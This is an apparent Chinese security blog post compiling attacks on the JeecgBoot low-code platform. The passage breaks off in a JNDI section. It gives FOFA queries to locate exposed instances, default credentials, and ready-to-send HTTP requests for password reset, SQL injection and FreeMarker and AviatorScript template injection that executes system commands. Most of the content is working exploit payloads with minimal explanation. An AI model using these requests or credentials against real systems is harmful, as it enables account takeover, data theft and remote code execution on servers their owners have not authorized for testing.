@@ -1,0 +1,726 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="MaskObito">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介JeecgBoot是一款集成AI应用的，基于BPM流程的低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design&amp;Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成-&gt;OnlineCodin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jeecg-boot漏洞挖掘">
+<meta property="og:url" content="http://maskobito.github.io/2025/06/14/jeecg-boot%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.html">
+<meta property="og:site_name" content="MaskObito">
+<meta property="og:description" content="简介JeecgBoot是一款集成AI应用的，基于BPM流程的低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design&amp;Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成-&gt;OnlineCodin">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://maskobito.github.io/images/6b1710a1-6074-4425-bb21-7ca65f052078.png">
+<meta property="og:image" content="http://maskobito.github.io/images/07c514aa-3a2b-40f8-8ae4-6cdbfb37bd5a.png">
+<meta property="article:published_time" content="2025-06-13T18:23:08.000Z">
+<meta property="article:modified_time" content="2025-09-22T13:39:13.673Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://maskobito.github.io/images/6b1710a1-6074-4425-bb21-7ca65f052078.png">
+  
+  
+  
+  <title>jeecg-boot漏洞挖掘 - MaskObito</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/neon.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"maskobito.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[],"type":"particle"},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"language":"zh-CN","enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">MaskObito</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="jeecg-boot漏洞挖掘"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-14 02:23" pubdate>
+          2025年6月14日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">jeecg-boot漏洞挖掘</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JeecgBoot是一款集成AI应用的，基于BPM流程的低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design&amp;Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成-&gt;OnlineCoding-&gt; 代码生成-&gt; 手工MERGE， 帮助Java项目解决80%的重复工作，让开发更多关注业务，提高效率、节省成本，同时又不失灵活性！低代码能力：Online表单、表单设计、流程设计、Online报表、大屏&#x2F;仪表盘设计、报表设计; AI应用平台功能：AI知识库问答、AI模型管理、AI流程编排、AI聊天等，支持含ChatGPT、DeepSeek、Ollama等多种AI大模型。</p>
+<h2 id="fofa语句"><a href="#fofa语句" class="headerlink" title="fofa语句"></a>fofa语句</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">body</span>=<span class="hljs-string">&quot;/sys/common/pdf/pdfPreviewIframe&quot;</span><br><span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Jeecg-Boot 快速开发平台&quot;</span> || body=<span class="hljs-string">&quot;积木报表&quot;</span><br><span class="hljs-attr">body</span>=<span class="hljs-string">&quot;jeecg-boot&quot;</span><br><span class="hljs-attr">app</span>=<span class="hljs-string">&quot;JEECG&quot;</span><br><span class="hljs-attr">icon_hash</span>=<span class="hljs-string">&quot;1380908726&quot;</span><br><span class="hljs-attr">icon_hash</span>=<span class="hljs-string">&quot;-250963920&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="加载界面"><a href="#加载界面" class="headerlink" title="加载界面"></a>加载界面</h2><p><img src="/../images/6b1710a1-6074-4425-bb21-7ca65f052078.png" srcset="/img/loading.gif" lazyload alt="6b1710a1-6074-4425-bb21-7ca65f052078"></p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin/123456<br>jeecg/123456<br>admn/admin<br><span class="hljs-built_in">test</span>/test<br>demo/test<br>jeecg/jeecg123456<br>guest/guest<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="JeecgBoot-passwordChange接口任意用户密码重置"><a href="#JeecgBoot-passwordChange接口任意用户密码重置" class="headerlink" title="JeecgBoot passwordChange接口任意用户密码重置"></a>JeecgBoot passwordChange接口任意用户密码重置</h2><blockquote>
+<p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;user&#x2F;passwordChange?username&#x3D;admin&amp;password&#x3D;admin&amp;smscode&#x3D;&amp;phone&#x3D; HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko&#x2F;20100101 Firefox&#x2F;132.0<br>Accept: <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive</p>
+</blockquote>
+<h2 id="jeecg-boot-checkOnlyUser信息泄露漏洞"><a href="#jeecg-boot-checkOnlyUser信息泄露漏洞" class="headerlink" title="jeecg-boot-checkOnlyUser信息泄露漏洞"></a>jeecg-boot-checkOnlyUser信息泄露漏洞</h2><blockquote>
+<p>&#x2F;jeecg-boot&#x2F;sys&#x2F;user&#x2F;querySysUser?username&#x3D;admin</p>
+<p>Jeecg-Boot 2.4.5及之前版本存在不安全权限漏洞。攻击者可利用该漏洞通过uri:&#x2F;sys&#x2F;user&#x2F;checkOnlyUser?username&#x3D;admin提升权限并查看敏感信息。</p>
+</blockquote>
+<h2 id="jeecg-boot-目录遍历漏洞"><a href="#jeecg-boot-目录遍历漏洞" class="headerlink" title="jeecg-boot-目录遍历漏洞"></a>jeecg-boot-目录遍历漏洞</h2><blockquote>
+<p>&#x2F;jeecg-boot&#x2F;online&#x2F;cgform&#x2F;head&#x2F;fileTree?_t&#x3D;1632524014&amp;parentPath&#x3D;&#x2F;</p>
+<p>低权限账号访问直接返回服务器文件目录信息</p>
+</blockquote>
+<h2 id="Jeecg-boot-3-4-4-sys-dict-queryTableData-SQL注入"><a href="#Jeecg-boot-3-4-4-sys-dict-queryTableData-SQL注入" class="headerlink" title="Jeecg-boot 3.4.4 &#x2F;sys&#x2F;dict&#x2F;queryTableData SQL注入"></a>Jeecg-boot 3.4.4 &#x2F;sys&#x2F;dict&#x2F;queryTableData SQL注入</h2><blockquote>
+<p>在Jeecg-boot 3.4.4中曾发现分类为致命的漏洞。 此漏洞会影响未知代码文件&#x2F;sys&#x2F;dict&#x2F;queryTableData。 手动调试的不合法输入可导致 SQL注入。</p>
+<p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;qurestSql HTTP&#x2F;1.1<br>User-Agent: Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit&#x2F;525.13 (KHTML, like Gecko) Chrome&#x2F;0.2.149.29 Safari&#x2F;525.13<br>Content-Type: application&#x2F;json; charset&#x3D;utf-8<br>Content-Length: 127<br>Host:<br>Connection: close<br>Accept-Encoding: gzip, deflate</p>
+<p>{“apiSelectId”:”1316997232402231298”,”id”:”1’ or ‘%1%’ like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or ‘%%’ like ‘“}</p>
+</blockquote>
+<h2 id="JeecgBoot-onlDragDatasetHead-getTotalData-SQL注入"><a href="#JeecgBoot-onlDragDatasetHead-getTotalData-SQL注入" class="headerlink" title="JeecgBoot onlDragDatasetHead&#x2F;getTotalData SQL注入"></a>JeecgBoot onlDragDatasetHead&#x2F;getTotalData SQL注入</h2><blockquote>
+<p>JeecgBoot v3.7.1 通过组件 &#x2F;onlDragDatasetHead&#x2F;getTotalData 存在 SQL 注入漏洞。</p>
+<p>POST &#x2F;jeecg-boot&#x2F;drag&#x2F;onlDragDatasetHead&#x2F;getTotalData HTTP&#x2F;2<br>Host:<br>Accept-Encoding: gzip, deflate<br>Accept: <em>&#x2F;</em><br>Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;109.0.5414.75 Safari&#x2F;537.36<br>Content-Type: application&#x2F;json<br>Content-Length: 281</p>
+<p>{“tableName”:”sys_user”,”compName”:”test”,”condition”:{“filter”:{}},”config”:{“assistValue”:[],”assistType”:[],”name”:[{“fieldName”:”concat(0x7e,version(),0x7e)”,”fieldType”:”string”},{“fieldName”:”id”,”fieldType”:”string”}],”value”:[{“fieldName”:”id”,”fieldType”:”1”}],”type”:[]}}</p>
+</blockquote>
+<h2 id="jeecg-boot-getDictItemsByTable-SQL注入漏洞"><a href="#jeecg-boot-getDictItemsByTable-SQL注入漏洞" class="headerlink" title="jeecg-boot-getDictItemsByTable SQL注入漏洞"></a>jeecg-boot-getDictItemsByTable SQL注入漏洞</h2><blockquote>
+<p>JeecgBoot是一款基于代码生成器的低代码开发平台，它专为简化Java项目开发流程、提高开发效率而设计。攻击者通过注入恶意的SQL代码，能够窃取、篡改或删除数据库中的数据，甚至执行系统命令，对网站和服务器造成严重影响。</p>
+<p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;ng-alain&#x2F;getDictItemsByTable&#x2F;‘%20from%20sys_user&#x2F;*,%20’&#x2F;x.js HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko&#x2F;20100101 Firefox&#x2F;133.0<br>Accept: <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>Sec-Purpose: prefetch<br>Connection: close<br>Priority: u&#x3D;6</p>
+</blockquote>
+<h2 id="Jeecg-Boot-jmreport-show-SQL注入漏洞"><a href="#Jeecg-Boot-jmreport-show-SQL注入漏洞" class="headerlink" title="Jeecg-Boot &#x2F;jmreport&#x2F;show SQL注入漏洞"></a>Jeecg-Boot &#x2F;jmreport&#x2F;show SQL注入漏洞</h2><blockquote>
+<p>jeecg-boot 3.5.0和3.5.1 版本存在安全漏洞，该漏洞源于 &#x2F;jeecg-boot&#x2F;jmreport&#x2F;show 接口的 id 参数存在SQL注入漏洞。</p>
+<p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;show HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 5.1) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;34.0.1866.237 Safari&#x2F;537.36<br>Connection: close<br>Content-Length: 182<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Accept-Encoding: gzip</p>
+<p>{<br>“id”: “961455b47c0b86dc961e90b5893bff05”,<br>“apiUrl”: “”,<br>“params”: {<br>“id “: “1 ‘ or ‘ % 1 % ‘ like (updatexml(0x3a,concat(1,(version())),1)) or ‘ % % ‘ like ‘“<br>}<br>}</p>
+</blockquote>
+<h2 id="jeecg-boot-sys-duplicate-check-SQL注入"><a href="#jeecg-boot-sys-duplicate-check-SQL注入" class="headerlink" title="jeecg-boot sys&#x2F;duplicate&#x2F;check SQL注入"></a>jeecg-boot sys&#x2F;duplicate&#x2F;check SQL注入</h2><blockquote>
+<p>&#x2F;sys&#x2F;duplicate&#x2F;check 接口SQL注入，checksql可以被绕过，该漏洞需要进行身份认证。</p>
+<p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;duplicate&#x2F;check?tableName&#x3D;v3_hello&amp;fieldName&#x3D;1+and%09if(user(%20)&#x3D;‘root@localhost’,sleep(0),sleep(0))&amp;fieldVal&#x3D;1&amp;dataId&#x3D;asd HTTP&#x2F;1.1<br>Host:<br>Accept-Encoding: gzip, deflate<br>Accept: <em>&#x2F;</em><br>Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;103.0.5060.114 Safari&#x2F;537.36<br>Connection: close<br>Cache-Control: max-age&#x3D;0<br>X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</p>
+<p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;duplicate&#x2F;check?tableName&#x3D;sys_log&amp;fieldName&#x3D;1+and%09if(user(%20)&#x3D;‘root@localhost’,sleep(0),sleep(10))&amp;fieldVal&#x3D;1000&amp;dataId&#x3D;2000 HTTP&#x2F;1.1<br>Host:<br>Accept-Encoding: gzip, deflate<br>Accept: <em>&#x2F;</em><br>Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;103.0.5060.114 Safari&#x2F;537.36<br>Connection: close<br>Cache-Control: max-age&#x3D;0<br>X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</p>
+</blockquote>
+<h2 id="JeecgBoot-jmreport-loadTableData-SSTI模板注入漏洞"><a href="#JeecgBoot-jmreport-loadTableData-SSTI模板注入漏洞" class="headerlink" title="JeecgBoot jmreport&#x2F;loadTableData SSTI模板注入漏洞"></a>JeecgBoot jmreport&#x2F;loadTableData SSTI模板注入漏洞</h2><blockquote>
+<p>jeecg-boot 版本 3.5.3 中的 SSTI 注入漏洞允许远程攻击者通过对 &#x2F;jmreport&#x2F;loadTableData 组件进行精心设计的 HTTP 请求执行任意代码。</p>
+<p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;loadTableData HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;116.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>X-Sign: AD0488642A880C68C8E3551C3BE0F6F5<br>X-TIMESTAMP: 1699726206096<br>X-Access-Token: null<br>token: null<br>JmReport-Tenant-Id: null<br>Content-Length: 167<br>Connection: close<br>Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8&#x3D;1699726144; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8&#x3D;1699726162</p>
+<p>{“dbSource”:””,”sql”:”select ‘&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;${value(&quot;whoami&quot;)}’”,”tableName”:”test_demo);”,”pageNo”:1,”pageSize”:10}</p>
+</blockquote>
+<h2 id="JeecgBoot-AviatorScript表达式注入"><a href="#JeecgBoot-AviatorScript表达式注入" class="headerlink" title="JeecgBoot AviatorScript表达式注入"></a>JeecgBoot AviatorScript表达式注入</h2><blockquote>
+<p>积木报表软件存在AviatorScript代码注入RCE漏洞。使用接口&#x2F;jmreport&#x2F;save处在text中写入AviatorScript表达式。访问&#x2F;jmreport&#x2F;show触发AviatorScript解析从而导致命令执行。</p>
+<p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;queryFieldBySql?previousPage&#x3D;xxx&amp;jmLink&#x3D;YWFhfHxiYmI&#x3D;&amp;token&#x3D;123 HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;115.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Content-Type: application&#x2F;json<br>Content-Length: 108</p>
+<p>{“sql”:”select ‘result:&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ex(&quot;whoami &quot;) }’”<br>}</p>
+</blockquote>
+<h2 id="jeecg-boot后台-sysMessageTemplate-sendMsg接口freemaker模板注入"><a href="#jeecg-boot后台-sysMessageTemplate-sendMsg接口freemaker模板注入" class="headerlink" title="jeecg-boot后台&#x2F;sysMessageTemplate&#x2F;sendMsg接口freemaker模板注入"></a>jeecg-boot后台&#x2F;sysMessageTemplate&#x2F;sendMsg接口freemaker模板注入</h2><blockquote>
+<p>jeecg-boot的Freemarker模板注入导致远程命令执行, 远程攻击者可利用该漏洞调用在系统上执行任意命令。</p>
+<p>1、添加一个测试模板</p>
+<p>POST &#x2F;jeecg-boot&#x2F;sys&#x2F;message&#x2F;sysMessageTemplate&#x2F;add HTTP&#x2F;1.1<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko&#x2F;20100101 Firefox&#x2F;133.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao<br>Tenant-Id: 0<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: cross-site<br>Priority: u&#x3D;0<br>Te: trailers<br>Connection: close<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Content-Length: 141</p>
+<p>{“templateType”:”1”,”templateCode”:”5”,”templateName”:”test111”,”templateContent”:”${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)}”}</p>
+<p>2、发送模板</p>
+<p>POST &#x2F;jeecg-boot&#x2F;sys&#x2F;message&#x2F;sysMessageTemplate&#x2F;sendMsg HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko&#x2F;20100101 Firefox&#x2F;133.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao<br>Tenant-Id: 0<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: cross-site<br>Priority: u&#x3D;0<br>Te: trailers<br>Connection: close<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Content-Length: 64</p>
+<p>{“templateCode”:”5”,”testData”:”{}”,”receiver”:””,”msgType”:”1”}</p>
+<p>3、执行模板并查看返回结果</p>
+<p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;message&#x2F;sysMessage&#x2F;list?_t&#x3D;1732776144&amp;column&#x3D;createTime&amp;order&#x3D;desc&amp;field&#x3D;id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&amp;pageNo&#x3D;1&amp;pageSize&#x3D;10 HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko&#x2F;20100101 Firefox&#x2F;133.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao<br>Tenant-Id: 0<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: cross-site<br>Priority: u&#x3D;0<br>Te: trailers<br>Connection: close<br>Accept-Encoding: gzip</p>
+</blockquote>
+<h2 id="Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞"><a href="#Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞" class="headerlink" title="Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞"></a>Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞</h2><blockquote>
+<p>JEECG 4.0 及之前版本中，由于 &#x2F;api 接口鉴权时未过滤路径遍历，攻击 者可构造包含 ..&#x2F; 的 url 绕过鉴权。 因为依赖 1.2.31 版本的 fastjson， 该版本存在反序列化漏洞。攻击者可对</p>
+<p>&#x2F;api&#x2F;..&#x2F;jeecgFormDemoController.do?interfaceTest 接口进行 jndi 注入攻 击实现远程代码执行。</p>
